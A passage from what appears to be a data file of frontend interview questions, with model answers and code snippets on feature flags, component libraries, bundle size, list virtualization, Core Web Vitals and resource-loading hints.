**3. A typed flag client.** Codegen a TS object from the flag definitions so \`flags.checkoutV2\` is type-safe and \`flags.get("checkuot-v2")\` (typo) is a compile error. When a flag is removed from the config, every consumer becomes a type error, surfacing the dead code automatically. Without this, flag references drift and you can't tell which ones are still live.

**4. Default OFF + kill switch.** Every flag must have a "kill" value that resolves to the *previous, known-good behavior*. \`isEnabled('newCheckout', { fallback: false })\` — and the fallback path is the unconditionally tested legacy code. Test the kill path in CI by running the suite once with all flags off. The kill switch should be reachable without a deploy and ideally under 60s end-to-end.

**5. Lifecycle hygiene.** Every flag gets an *owner*, an *expiry date*, and a removal ticket filed at creation time. A weekly Slack reminder or automated PR removes expired flags. Long-lived "permanent" flags (kill switches for infrastructure dependencies, premium tier gates) are tagged differently so they don't get pruned. Without this, a 3-year-old codebase has 400 dormant flags and the cyclomatic complexity of a fractal.

**6. Targeting & rollout.** Support multiple rules: user id, percentage rollout, environment, geography, plan tier, query-param override (\`?ff=checkoutV2\`) for QA. Always hash on a *stable* user id (or anonymous session id) so a user gets the same variant across visits — sticky bucketing matters for honest A/B tests. Percentage rollouts should be deterministic: \`hash(userId + flagName) % 100 < pct\`.

**7. Observability.** Emit a structured event whenever a flag is *evaluated* (with user id, flag, variant, timestamp), not when it's *defined*. Track per-flag conversion / error metrics. The first sign of a bad rollout is usually an error rate that diverges between variants — you should see it within minutes, not days. Hook the flag service to a metrics platform so anyone can plot variant impact.

**SSR / CSR consistency.** A flag evaluated on the server must be passed to the client (via initial props, cookies, or a context) so the first client render matches. Otherwise hydration mismatches.

**Anti-patterns:**

- Boolean flags for what is really configuration (use a separate config system).
- Nesting flags (\`if (newCheckout && newAddressForm && betaSearch)\`) — combinatorial paths nobody tests.
- Putting business logic behind flags that survive shipping (the flag becomes architectural; refactor instead).
- Reading flags inside hot loops instead of resolving once per request.

Treat flags like locks: cheap to add, expensive to leave around.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Typed flag client + safe usage",
          code: `// generated from flag service
export const FLAGS = { checkoutV2: false, newSearch: false } as const;
export type FlagKey = keyof typeof FLAGS;

export function useFlag<K extends FlagKey>(k: K): boolean {
  return useContext(FlagContext)[k] ?? FLAGS[k];
}

// usage
function Checkout() {
  const v2 = useFlag("checkoutV2");
  return v2 ? <CheckoutV2 /> : <CheckoutV1 />;
}`,
        },
      ],
      followUps: [
        "How do you handle hydration when a flag flips between SSR and CSR?",
        "What's your strategy for flag cleanup at scale?",
        "How would you A/B test an SSR-rendered page?",
      ],
      commonMistakes: [
        "Ad-hoc booleans in env vars masquerading as flags.",
        "Forgetting to remove a flag after rollout — old branches rot.",
        "Evaluating client-side only → user sees flicker as flag arrives.",
      ],
      performanceConsiderations: [
        "Server-evaluated flags add zero client cost.",
        "Watch for cache-key explosion if you key SSR cache on flag combinations.",
      ],
      edgeCases: [
        "Flag service outage — must fall back to safe defaults, not block the app.",
        "Sticky bucketing across logged-out → logged-in transitions requires merging anonymous and user IDs.",
      ],
      realWorldExamples: [
        "GitHub uses flipper, Shopify uses Beta Flags, Vercel uses Edge Config + flag SDK for instant evaluation.",
      ],
      relatedSlugs: [
        "structure-scalable-frontend-app-100-pages",
        "what-causes-hydration-mismatches-in-next-js",
      ],
      companyTags: ["GitHub", "Shopify", "Vercel", "Atlassian"],
      estimatedReadingMinutes: 8,
      estimatedSolvingMinutes: 15,
    },
  },
  {
    title: "How would you design a reusable component library across teams?",
    question: {
      id: "how-would-you-design-a-reusable-component-library-across-teams",
      slug: "how-would-you-design-a-reusable-component-library-across-teams",
      title: "How would you design a reusable component library across teams?",
      category: "architecture",
      tags: ["design-system", "component-library", "monorepo", "tokens"],
      difficulty: "hard",
      frequency: "high",
      seniority: "senior",
      shortDescription:
        "Token-driven theming, headless primitives + styled wrappers, semantic-versioned releases, automated visual regression, and a contribution model that prevents fragmentation.",
      answer: `A component library that serves N product teams is a *product* in its own right, with its own roadmap, SLOs, and consumers. The dominant failure mode is **fragmentation**: a team forks because the library lacks one prop they need, that fork copy-pastes into a second team, and within a year you have three Button components and no consistent look. The architecture and the operating model both have to prevent that.

**1. Tokens first, components second.** Before any component is built, define the token layer: color (raw → semantic → component-specific), spacing scale, typography ramp, radii, shadows, motion durations, easing, z-index. Express tokens as CSS variables (\`--color-bg-surface\`) so theme switching (light/dark/brand) and white-labeling are free. Components consume *semantic* tokens (\`var(--color-text-primary)\`), never raw values. Tools: Style Dictionary, Tokens Studio, or a flat JSON exported to multiple targets.

**2. Headless + styled split.** Behavior (focus management, ARIA, keyboard, RTL handling) goes into **headless primitives** — adopt Radix UI, Ark UI, Headless UI, or React Aria rather than rebuilding. On top, your library owns a thin styled layer that applies tokens. This means: a consumer who needs a weird visual variant doesn't have to fork — they drop down to the headless layer. shadcn/ui's "copy into your repo" model is the most extreme version of this: every consumer literally owns the component, no version pinning, full local customization. Pick the model that fits your governance.

**3. API discipline.** A library lives or dies by its public API. Rules of thumb:
- **Composable, not monolithic.** \`<Card><Card.Header/>...</Card>\` lets consumers omit pieces; a 12-prop \`<Card title body footer leftIcon ...>\` traps everyone.
- **Polymorphic** via \`as\` prop or Radix's \`asChild\` so consumers can render the right semantic element (\`<Button as="a">\` for a link styled as a button).
- **Controlled + uncontrolled** variants with consistent prop names (\`value\`/\`defaultValue\`, \`open\`/\`defaultOpen\`).
- **No leaky internals.** Never expose internal CSS class names, internal context, or component-internal data attributes. They become *de facto* APIs and break refactors.
- **Forward refs**, support \`className\` and \`style\` overrides on the outermost element, but only as escape hatches.

**4. Versioning & deprecation.** Strict SemVer. Major versions cluster breaking changes; minors only add; patches only fix. Pair every deprecation with: a \`@deprecated\` JSDoc tag (IDE hint), an ESLint rule that warns on usage, a codemod that auto-migrates, and a removal target version. Use \`changesets\` for per-PR changelog entries. *Never* break a public API in a minor — consumers will lose trust and freeze versions.

**5. Quality bar (CI):**
- **Visual regression**: Storybook + Chromatic (or Playwright + percy / Loki). Every component renders every variant; PRs surface visual diffs.
- **Accessibility**: \`axe-core\` against every story; deny merge on regressions.
- **Type safety**: TypeScript strict, no \`any\` in public types, \`tsd\` type tests for tricky generics.
- **Bundle budget**: per-component size budget enforced with size-limit; PR fails if a button balloons from 1KB to 10KB.
- **Unit + interaction tests**: \`@testing-library\` + Playwright Component Testing.

**6. Distribution.** Publish to a private npm registry per major version (e.g., \`@acme/ui@2\` and \`@acme/ui@3\` side-by-side during a migration window). For monorepos consuming the lib, ship via Turborepo / Nx so consumers pick up changes via build graph. Avoid CSS-in-JS that ties consumers to a specific runtime; prefer CSS modules, Vanilla Extract, or Tailwind with token preset.

**7. Documentation.** Storybook is the canonical doc — runnable examples, prop tables, accessibility notes. Pair with a written usage guide ("when to use Modal vs Sheet"). Documentation is part of the API; ship docs in the same PR as the component.

**8. Contribution & governance model.** This is where most libraries die. Decide upfront: federated (any team can contribute), centralized (a platform team owns it), or hybrid (federated for components, central for tokens & primitives). Require an **RFC** for new components with proof of demand ("3 teams need it"). Open office hours; a \`#design-system\` channel; a public roadmap. Communication is the real cost — engineering is the cheap part.

The product mindset matters most: the library has *users*, not consumers. Track adoption, measure component coverage per app, do user research on what's painful, and prune unused components after a year. A library nobody can keep up with is worse than no library.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Polymorphic + composable button",
          code: `import { Slot } from "@radix-ui/react-slot";

type ButtonProps = React.ComponentPropsWithoutRef<"button"> & {
  variant?: "primary" | "ghost";
  asChild?: boolean;
};

export function Button({ asChild, variant = "primary", className, ...props }: ButtonProps) {
  const Comp = asChild ? Slot : "button";
  return <Comp className={cn(variants[variant], className)} {...props} />;
}

// Render as a Next.js Link without losing button styling
<Button asChild>
  <Link href="/x">Go</Link>
</Button>`,
        },
      ],
      followUps: [
        "How do you prevent teams from forking a component when their use case isn't supported?",
        "What's your visual regression strategy?",
        "How do you handle theming for white-label apps?",
      ],
      commonMistakes: [
        "Designing components in isolation from real product use cases.",
        "Exposing CSS classes as part of the public API.",
        "No SemVer discipline — every change feels major.",
      ],
      performanceConsiderations: [
        "Tree-shake-friendly exports (named, no re-export barrels with side effects).",
        "Avoid heavy runtime-only theming — CSS variables compile away.",
      ],
      edgeCases: [
        "Form components with controlled+uncontrolled modes silently break unless asserted at the type level.",
      ],
      realWorldExamples: [
        "Shopify Polaris, Atlassian Design System, GitHub Primer, shadcn/ui (un-library).",
      ],
      relatedSlugs: ["structure-scalable-frontend-app-100-pages"],
      companyTags: ["Shopify", "Atlassian", "GitHub", "Stripe"],
      estimatedReadingMinutes: 10,
      estimatedSolvingMinutes: 20,
    },
  },

  // ============================================================
  // PERFORMANCE
  // ============================================================
  {
    title: "How do you reduce bundle size in production?",
    question: {
      id: "how-do-you-reduce-bundle-size-in-production",
      slug: "how-do-you-reduce-bundle-size-in-production",
      title: "How do you reduce bundle size in production?",
      category: "performance",
      tags: ["bundle-size", "code-splitting", "tree-shaking", "webpack", "performance"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "Measure first, then: tree-shake, route-split, dynamic import heavy widgets, swap heavy deps, ship modern syntax, and budget aggressively.",
      answer: `Bundle size is the single biggest predictor of mobile Time to Interactive on cold loads — every 100KB of JS costs ~100–300ms of parse-and-execute on a mid-range phone, before any network cost. So the goal isn't a smaller number on a treemap; it's faster INP and TTI on real devices. Work the problem in order: **measure → kill the worst offender → set a budget → repeat**.

**1. Measure first.** Never optimize blind. Use:

- \`next build\` — prints a per-route first-load JS table; the canonical scoreboard.
- \`@next/bundle-analyzer\` / \`webpack-bundle-analyzer\` — treemap of what's in each chunk.
- \`source-map-explorer\` — source-level attribution for any bundle.
- \`statoscope\` — diff two builds; great for "what just regressed."
- Real-user metrics (LCP, INP from CrUX) — the actual user-felt outcome.

Pick the heaviest module on the treemap; you can usually delete or replace it in an hour.

**2. Route-level code splitting** is free in Next.js / Remix / TanStack Router. Verify every route's first-load JS budget — aim for <150KB gzip for landing routes, <250KB for app routes. If a route is heavy, the cause is usually one heavy dependency leaking into the root layout.

**3. Dynamic import below-the-fold or interaction-gated code.** Charts, code editors, video players, rich-text editors, comment forms, modals — all candidates for \`next/dynamic\` or \`React.lazy\` + \`<Suspense>\`. Pattern: \`const Chart = dynamic(() => import('./Chart'), { ssr: false, loading: () => <Skeleton/> })\`. The library only ships when the user opens the panel.

**4. Tree-shaking — make sure it actually works.** Bundlers can only tree-shake ESM with explicit side-effect markers. Verify:
- Your library's \`package.json\` has \`"sideEffects": false\` (or a precise list).
- You use **named imports**: \`import { debounce } from 'lodash-es'\` not \`import _ from 'lodash'\` (the latter pulls all of lodash).
- Avoid **barrel files** (\`index.ts\` that re-exports everything) in heavily-imported packages — they defeat tree-shaking in some bundler configs. Import from deep paths or use \`/* @__PURE__ */\` annotations.
- Use ESM dependencies; CJS sometimes blocks shaking.

**5. Replace the worst offenders.** Common wins:
- \`moment\` (60KB) → \`date-fns\` (per-fn) or \`dayjs\` (2KB).
- \`lodash\` (24KB) → native or \`lodash-es/fn\` per function.
- \`recharts\` / Chart.js (~100KB) → \`uplot\` / \`@nivo\` subset / custom SVG.
- Icon packs — import individual icons (\`lucide-react\`'s tree-shaking, or HeroIcons individual paths), not the whole index.
- \`react-icons\` (default barrel) → swap to specific packs.
- Polyfills (core-js) — audit \`browserslist\` to drop anything pre-2020.

**6. Ship modern syntax.** Configure \`browserslist\` to exclude IE11 and very old Safari/Android. SWC / esbuild then emits ES2022 directly; no Babel polyfills, no Symbol shims, no helper duplication. If you must serve legacy browsers, use **differential serving** (modulepreload modern + nomodule legacy).

**7. Polyfill audit.** \`@babel/preset-env\` with \`useBuiltIns: "entry"\` blindly imports polyfills based on targets. Check the actual emitted code; you may be shipping \`URL\` and \`Promise.finally\` polyfills for Chrome users.

**8. Shared / vendor chunks.** Bundlers split common deps into shared chunks (\`framework.js\`, \`vendors.js\`). Ensure no rarely-used giant library has leaked into every route's shared chunk. \`next build\` prints per-chunk sizes; bundle-analyzer shows what's inside.

**9. Server Components & "use server".** In the App Router, components that don't need interactivity stay on the server and ship zero JS. The biggest single bundle win in a Next 13+ migration is correctly tagging client boundaries.

**10. CSS.** Tailwind purges unused classes automatically; verify in production. Inline critical CSS (Next.js does this for App Router). Avoid CSS-in-JS that ships a runtime; prefer compile-time CSS (Vanilla Extract, Linaria, Tailwind).

**11. Image bundles.** SVG icons inlined in JS bloat the bundle. Use \`<Image>\` with the asset pipeline; lazy-load via \`loading="lazy"\`.

**12. CI budgets.** Add a \`size-limit\` or Lighthouse CI step that *fails* the PR if any route's first-load JS grows beyond budget (or grows >5KB unexpectedly). Without a guard, the bundle grows monotonically — every new feature adds bytes, almost none remove them.

**Workflow recap.** Open the analyzer → pick the largest leaf → either dynamic-import it, replace it, or delete it → re-measure → repeat. After a few passes you've usually halved the bundle. Then put a CI guard in place so it stays there.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Dynamic import with skeleton",
          code: `import dynamic from "next/dynamic";

const Chart = dynamic(() => import("@/features/analytics/Chart"), {
  ssr: false,
  loading: () => <ChartSkeleton />,
});`,
        },
        {
          language: "json",
          caption: "size-limit budget in package.json",
          code: `{
  "size-limit": [
    { "path": ".next/static/chunks/main-*.js", "limit": "80 KB" },
    { "path": ".next/static/chunks/pages/index-*.js", "limit": "30 KB" }
  ]
}`,
        },
      ],
      followUps: [
        "How does Next.js handle tree-shaking with App Router?",
        "What's the trade-off in dynamic-importing every component?",
        "How do you detect a regression at PR time?",
      ],
      commonMistakes: [
        "Dynamic-importing tiny components — adds network/runtime overhead for no win.",
        "Default-importing entire libraries.",
        "Ignoring polyfill bloat.",
      ],
      performanceConsiderations: [
        "Bundle size affects TTI more than LCP — but both via main thread block.",
        "Network cost is non-linear: an extra 50KB on slow 3G is brutal.",
      ],
      edgeCases: [
        "Dynamic imports in event handlers cause click → fetch latency; preload on hover for critical interactions.",
      ],
      realWorldExamples: [
        "Shopify cut their checkout JS by 40% by moving moment → date-fns and per-route splits.",
      ],
      relatedSlugs: [
        "how-do-you-optimize-core-web-vitals",
        "explain-lazy-loading-vs-preloading-vs-prefetching",
      ],
      companyTags: ["Vercel", "Shopify", "Airbnb"],
      estimatedReadingMinutes: 8,
      estimatedSolvingMinutes: 15,
    },
  },
  {
    title: "When would you use virtualization?",
    question: {
      id: "when-would-you-use-virtualization",
      slug: "when-would-you-use-virtualization",
      title: "When would you use virtualization?",
      category: "performance",
      tags: ["virtualization", "windowing", "react-window", "tanstack-virtual", "performance"],
      difficulty: "medium",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "When the list is long enough (≈hundreds of rows) that DOM nodes alone hurt — measure first. Virtualization renders only visible rows + overscan, trading complexity for memory and render time.",
      answer: `**Virtualization** (a.k.a. *windowing*) is the technique of rendering only the slice of a long list that's currently visible (plus a small *overscan* buffer above and below), and faking the total scroll height with an empty spacer. Even if the data has 1,000,000 rows, the DOM might hold 30 — react renders quickly, scrolling stays at 60fps, memory stays flat. It's a classic time/space trade: more code complexity in exchange for orders-of-magnitude better rendering performance.

**The mechanics.** A virtualizer needs three things: (1) total item count, (2) a way to know each row's height (fixed, estimated, or measured on render), (3) the scroll container's current scroll offset. From that it computes a *visible range* (\`startIndex\`, \`endIndex\`) and renders just those rows, positioned absolutely (or with translate transforms) inside a parent whose height equals the sum of all row heights. A spacer/relative offset keeps the scrollbar honest.

**Use it when:**

- The list has **enough items that DOM nodes alone are the cost** — typically several hundred non-trivial rows (images, multi-line text, tooltips, interactive controls). The threshold is "render time + GC time > frame budget."
- **Tables** with many rows × many columns — each cell is a DOM node, so cost scales as the product.
- **Chat / log / feed viewers** with append-heavy data — without virtualization, scrollback eventually freezes the tab.
- **Trees** with thousands of nodes (file explorers, org charts, JSON viewers).
- You can *measure* a real problem: scroll FPS <60, INP >200ms, a long task in the Performance panel.

**Don't use it when:**

- The list has <100 trivial items — the windowing overhead (math, refs, measurement) is more than the savings.
- Item heights are **highly variable and hard to estimate**, and your UX has lots of jump-to-anchor flows — measurement jitter causes scroll jumps that frustrate users.
- The content must be **crawlable** (SEO, Ctrl-F find-in-page). Crawlers and the browser's find feature only see what's in the DOM. Pagination or server-rendered chunks may be a better fit.
- The user expects predictable Ctrl-F or Tab key navigation across the entire list.

**Libraries:**

- **\`@tanstack/react-virtual\`** — modern, headless, supports dynamic sizes via measurement, works with any layout including grids. The default choice in 2025.
- **\`react-window\`** — simple, smaller, fixed-size lists or fixed-grid; fine for most basic cases.
- **\`react-virtualized\`** — older, heavier; superseded by react-window from the same author.
- **\`@tanstack/react-table\` + virtual** — sortable / filterable / virtualized tables.
- **\`react-arborist\`** — virtualized trees with drag/drop.

**Common pitfalls:**

- **Accessibility regressions.** Screen readers and assistive tech don't see off-screen rows. Use \`role="grid"\` + \`aria-rowcount\` + \`aria-rowindex\` so the AT knows the true size. Make sure keyboard navigation (\`Home\`/\`End\`, arrow keys) scrolls the right row into view and restores focus.
- **Find-in-page (Ctrl-F).** Browsers only search rendered text. Provide an in-app search/filter so users aren't stranded.
- **Anchor links and \`#hash\`.** \`location.hash = "#row-2003"\` won't find an unmounted row. Implement a manual scroll-to-index handler.
- **Sticky headers / footers.** Need explicit support from the library, otherwise they vanish when the windowed range scrolls past.
- **Variable heights.** Naïve approaches re-measure rows on each render, causing scrollbar jitter. Use a measurement cache keyed by item id; \`@tanstack/react-virtual\`'s \`measureElement\` handles this.
- **Resize.** When the container resizes (zoom, sidebar collapse), all measurements may need to be invalidated.
- **Interaction state across mount/unmount.** A row that unmounts loses local state (open menu, focus). Lift state up, or use overscan and stable keys to keep state alive while scrolling.

**Alternatives to virtualization:**

- **Pagination** (server-side or client-side) — simpler, crawlable, fewer accessibility hazards. The right answer for most product UIs.
- **Infinite scroll with pagination** — load 50 at a time on scroll; only renders what the user has seen. Keeps DOM bounded if you also unmount very-far-up rows.
- **Server-side cursors + lazy windows** — for truly infinite data (timelines, search results), combine pagination with virtualization just inside the loaded set.

**Decision flow:** is the list >500 non-trivial rows AND can't be paginated AND is causing measurable jank? → virtualize. Otherwise → paginate. Don't reach for windowing as the default; reach for it when DevTools tells you to.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "TanStack Virtual minimal example",
          code: `import { useVirtualizer } from "@tanstack/react-virtual";

function Rows({ items }: { items: string[] }) {
  const parentRef = useRef<HTMLDivElement>(null);
  const v = useVirtualizer({
    count: items.length,
    getScrollElement: () => parentRef.current,
    estimateSize: () => 40,
    overscan: 6,
  });
  return (
    <div ref={parentRef} className="h-96 overflow-auto">
      <div style={{ height: v.getTotalSize(), position: "relative" }}>
        {v.getVirtualItems().map((row) => (
          <div
            key={row.index}
            style={{
              position: "absolute",
              top: 0, left: 0, width: "100%",
              transform: \`translateY(\${row.start}px)\`,
              height: row.size,
            }}
          >
            {items[row.index]}
          </div>
        ))}
      </div>
    </div>
  );
}`,
        },
      ],
      followUps: [
        "How do you make virtualized lists accessible?",
        "When is pagination a better choice?",
        "How do variable-height rows complicate virtualization?",
      ],
      commonMistakes: [
        "Virtualizing tiny lists.",
        "Skipping `key` correctness — windowing reuses DOM nodes.",
        "Breaking Ctrl-F discoverability.",
      ],
      performanceConsiderations: [
        "Memory drops dramatically — DOM node count is the dominant cost.",
        "Scroll FPS improves when paint cost per frame drops.",
      ],
      edgeCases: [
        "Sticky headers, drag-reorder, and keyboard nav across windowed rows are non-trivial.",
      ],
      realWorldExamples: [
        "Linear's issue list, GitHub's file tree, Notion's database views.",
      ],
      relatedSlugs: ["how-do-you-reduce-bundle-size-in-production"],
      companyTags: ["Linear", "Notion", "GitHub"],
      estimatedReadingMinutes: 7,
      estimatedSolvingMinutes: 12,
    },
  },
  {
    title: "How do you optimize Core Web Vitals?",
    question: {
      id: "how-do-you-optimize-core-web-vitals",
      slug: "how-do-you-optimize-core-web-vitals",
      title: "How do you optimize Core Web Vitals?",
      category: "performance",
      tags: ["core-web-vitals", "lcp", "inp", "cls", "performance"],
      difficulty: "medium",
      frequency: "very-high",
      seniority: "mid",
      shortDescription:
        "LCP: ship the hero image fast (CDN, format, priority). INP: keep main-thread tasks short. CLS: reserve space for everything that loads later.",
      answer: `Core Web Vitals are the three metrics Google uses for both UX and search ranking: **LCP** (perceived load speed), **INP** (interactivity), **CLS** (visual stability). Each measures a different user-felt experience and each has its own optimization playbook. Trying to optimize all three with one trick (e.g., "ship less JS") is necessary but not sufficient.

**LCP — Largest Contentful Paint (target ≤ 2.5s)**

The time at which the *largest* visible element (often the hero image or hero text block) is painted. Browsers expose it via \`PerformanceObserver({ type: 'largest-contentful-paint' })\`. Find it in Chrome DevTools → Performance → "LCP" marker, or in Lighthouse's report.

The four phases of an LCP measurement: (1) TTFB — server response time, (2) load delay — time from response to LCP resource request, (3) load time — fetching the LCP resource, (4) render delay — time to actually paint. Most LCP wins come from (1) and (2):

- Serve from a **CDN** with edge caching; aim for TTFB <400ms.
- Use modern image formats: **AVIF** (smallest), then WebP, with PNG/JPEG fallbacks. Use \`srcset\` + \`sizes\` for responsive serving.
- Mark the hero with \`<img fetchpriority="high">\` or Next.js \`<Image priority>\` so the browser preloads it.
- **Don't lazy-load above-the-fold images** — that delays LCP.
- **Inline critical CSS** and defer the rest. Render-blocking CSS adds directly to LCP.
- **Preconnect** to your image / font CDNs; **preload** the LCP image (\`<link rel="preload" as="image">\`).
- Use **self-hosted fonts** with \`font-display: swap\` or \`optional\`; avoid late-arriving \`@font-face\` rules.
- Avoid huge client JS before paint — prefer SSR / streaming (Next.js App Router, Remix).
- Use \`<link rel="preload" as="fetch" fetchpriority="high">\` for above-the-fold JSON data so the network request starts during the HTML download.

**INP — Interaction to Next Paint (target ≤ 200ms)**

Replaced **FID** in March 2024. Measures the *worst* (P98) interaction latency across the session: tap, click, key press → next paint. Unlike FID, it captures interactions after first input. This is the metric most apps fail.

The contributors: input delay (main thread busy), processing time (event handler + React render), presentation delay (paint).

Optimizations:

- **Break up long tasks** (>50ms blocks). Use \`scheduler.yield()\` (Chromium), \`setTimeout(_, 0)\`, or \`requestIdleCallback\` to insert yield points. The \`isInputPending\` API tells you to bail out early.
- **\`useTransition\`** + \`useDeferredValue\` in React: keep input handlers cheap, defer expensive derived updates.
- **Web Workers** for CPU-heavy work (JSON parsing of large blobs, search indexing, image processing). The main thread should be a renderer, not a compute engine.
- **Hydration cost**: defer non-critical hydration with \`next/dynamic({ ssr: false })\` or RSC. Less hydration = less main-thread work during early interactions.
- **Event delegation** instead of attaching listeners to thousands of rows.
- **Debounce** input handlers that derive expensive views.
- Avoid forcing layout in click handlers (any read of \`offsetWidth\` after a write triggers sync layout).
- Memoize heavy components so click handlers don't trigger giant re-renders.

**CLS — Cumulative Layout Shift (target ≤ 0.1)**

Sum of all unexpected layout shifts across the page lifetime. Each shift's *impact fraction* × *distance fraction* contributes; the worst session 5-second window scores.

Optimizations:

- **Always set \`width\`/\`height\`** (or CSS \`aspect-ratio\`) on \`<img>\` and \`<video>\` so the browser reserves space before the asset loads.
- **Reserve space for ads, embeds, banners** with fixed-height containers. Late-loading content pushing the page down is the #1 cause of CLS regressions.
- **Don't insert content above the fold after load.** Cookie banners, "subscribe to our newsletter" toasts, late personalization headers — all common CLS killers. Inject them at the bottom of the layout, or pre-allocate space.
- **Font swaps.** Use \`font-display: optional\` (no swap if not in 100ms) or preload the font so it arrives in time. A "swap" from a system font to a custom font with different metrics causes line-height shifts.
- **CSS transforms** instead of layout for animations (\`transform: translateY(...)\` doesn't shift).
- **Skeletons** with the same final dimensions as the loaded content.

**Measurement.** Use both:

- **Lab data** (Lighthouse, WebPageTest, DevTools throttled mobile) — controlled, repeatable, tells you what the metric *could* be.
- **Field / RUM data** (Chrome User Experience Report / \`web-vitals\` JS library reporting to your analytics) — tells you what *real users* experience. Field is what Google uses for ranking. Always optimize toward the P75.

**Workflow.** Read field data → identify which metric fails → run a lab profile of a slow user's journey → fix the worst contributor → re-measure in field for 28 days. Don't chase Lighthouse scores; chase the P75 field metric for each route.`,
      codeSnippets: [
        {
          language: "tsx",
          caption: "Hero image with priority + sized container",
          code: `import Image from "next/image";

<div className="aspect-[16/9] relative">
  <Image
    src="/hero.jpg"
    alt="..."
    fill
    priority
    sizes="(min-width: 768px) 60vw, 100vw"
  />
</div>`,
        },
      ],
      followUps: [
        "How does INP differ from FID?",
        "When does inlining CSS hurt rather than help?",
        "How do you debug a high CLS in production?",
      ],
      commonMistakes: [
        "Optimizing lab Lighthouse score without checking field data.",
        "Lazy-loading the LCP image.",
        "Late-loading consent banners pushing layout.",
      ],
      performanceConsiderations: [
        "INP is now the hardest of the three — react interactions touch state, render, paint.",
      ],
      edgeCases: [
        "SPA navigation doesn't reset Web Vitals; consider `web-vitals` library's `reportAllChanges` for soft navs.",
      ],
      realWorldExamples: [
        "Vercel and Shopify publish CrUX dashboards per route — caught a CLS regression from font swap within hours.",
      ],
      relatedSlugs: [
        "how-do-you-reduce-bundle-size-in-production",
        "explain-lazy-loading-vs-preloading-vs-prefetching",
      ],
      companyTags: ["Google", "Vercel", "Shopify"],
      estimatedReadingMinutes: 9,
      estimatedSolvingMinutes: 15,
    },
  },
  {
    title: "Explain lazy loading vs preloading vs prefetching",
    question: {
      id: "explain-lazy-loading-vs-preloading-vs-prefetching",
      slug: "explain-lazy-loading-vs-preloading-vs-prefetching",
      title: "Explain lazy loading vs preloading vs prefetching",
      category: "performance",
      tags: ["lazy-loading", "preload", "prefetch", "resource-hints", "performance"],
      difficulty: "easy",
      frequency: "high",
      seniority: "mid",
      shortDescription:
        "Lazy: load when needed. Preload: load now, high priority, current page. Prefetch: load idle-time, low priority, future navigation.",
      answer: `These three (plus their cousins \`preconnect\`, \`dns-prefetch\`, \`modulepreload\`) all express timing hints to the browser: *when* should this resource be fetched, *how aggressively*, and *for which navigation*? Using them right can shave seconds off LCP and make route transitions feel instant; using them wrong wastes bandwidth, contends with the critical path, and can actually slow LCP.

**Lazy loading — defer until needed.**

The default position. Don't fetch a resource until the user is about to need it. Implementations:

- \`<img loading="lazy">\` — native browser API. The image is fetched only when it nears the viewport (the browser uses a heuristic threshold). Works for \`<iframe loading="lazy">\` too.
- \`React.lazy(() => import('./X'))\` or \`next/dynamic\` — the JS chunk and its dependencies are fetched when the component actually mounts (or on Suspense boundary resolution).
- Intersection-observer-driven manual lazy loading for custom widgets.

Use for: below-the-fold images, secondary route widgets, modal/dialog content, third-party embeds, large rich-media players.

Critical rule: **don't lazy-load your LCP image.** Lazy-loading the hero is counter-productive because the browser delays its fetch, and LCP rises. Mark the hero with \`loading="eager"\` (the default) and ideally \`fetchpriority="high"\`.

**Preload — fetch *now*, high priority, for the *current* navigation.**

\`<link rel="preload" href="/fonts/inter.woff2" as="font" type="font/woff2" crossorigin>\` tells the browser: "I will need this resource very soon on this page, start fetching it as soon as you parse this tag." Important: \`as\` is required — it determines priority class, CORS rules, and whether the response can be reused.

Use for: resources that are critical but **discovered late** by the parser. Examples:

- **Fonts declared inside CSS** (\`@font-face\`) — the browser doesn't know to fetch them until it has applied the CSS, which can be hundreds of ms in. Preload them in the HTML head.
- **Hero images set via CSS \`background-image\`** — same problem.
- **Above-the-fold JSON** that the page can't render without (use \`as="fetch"\`).

\`fetchpriority="high"\` on an \`<img>\` is a related signal for the LCP image without needing a separate preload link.

Don't use preload for things the parser would discover anyway (a normal \`<script src>\` or \`<img src>\` in the early HTML). Preload doesn't make them faster; it just adds noise and risks double-fetching if the \`as\` doesn't match exactly.

**Prefetch — fetch *during idle time*, low priority, for a *future* navigation.**

\`<link rel="prefetch" href="/dashboard">\` tells the browser "the user will probably navigate here next; if you have spare bandwidth/CPU, go fetch it." Priority is lowest; the browser may skip the prefetch on slow networks or under Data Saver. The result is cached at the HTTP layer, so when the user clicks, the navigation feels instant.

Frameworks automate this:
- **Next.js \`<Link>\`** prefetches automatically for links visible in the viewport (you can disable with \`prefetch={false}\`). This is why App Router navigations feel snappy.
- **Remix / TanStack Router** have similar intent-based prefetching.

Use prefetch for likely-next pages, *not* for the current page. It's a speculation, not a guarantee.

**Adjacent hints:**

- **\`dns-prefetch\`** — \`<link rel="dns-prefetch" href="//cdn.example.com">\`. Resolve the DNS name early. Very cheap; useful for third-party origins you'll hit eventually.
- **\`preconnect\`** — \`<link rel="preconnect" href="https://cdn.example.com" crossorigin>\`. DNS + TCP handshake + TLS negotiation. More expensive than \`dns-prefetch\` but pays huge dividends for known third-party origins (analytics, image CDN, font CDN). Limit to 2–3; each preconnect ties up a connection slot.
- **\`modulepreload\`** — \`<link rel="modulepreload" href="/chunks/lib.js">\`. Like preload, but for ES modules; the browser fetches *and* parses the module and its dependency graph. Used by bundlers for critical chunks.
- **Speculation Rules API** (newer) — \`<script type="speculationrules">\` lets you specify URLs to *prerender* (full render, not just fetch). Use sparingly; prerendering executes JS.

**Decision flow:**

- Need it now, but browser hasn't discovered it yet → **preload**.
- Need it eventually on this page (scroll, click) → **lazy**.
- Need it on a likely-next page → **prefetch**.
- About to hit a known third-party origin → **preconnect**.
- Just want DNS resolved early → **dns-prefetch**.
- Need an ES module + its graph fetched early → **modulepreload**.

**Pitfalls:**

- Preloading the wrong \`as\` causes double fetches and warnings in DevTools.
- Over-preloading clogs the critical path; the browser's bandwidth budget is finite.
- Prefetching too aggressively wastes mobile data — respect \`Save-Data\` header and \`navigator.connection.effectiveType\`.
- Preload fonts must include \`crossorigin\` (fonts are always CORS-fetched).
- Verify in DevTools → Network → "Priority" column; you should see the resource at the priority you intended.`,
      codeSnippets: [
        {
          language: "html",
          caption: "Resource hints in the document head",
          code: `<link rel="preconnect" href="https://cdn.example.com">
<link rel="preload" href="/fonts/inter.woff2" as="font" type="font/woff2" crossorigin>
<link rel="prefetch" href="/dashboard">`,
        },
      ],
      followUps: [
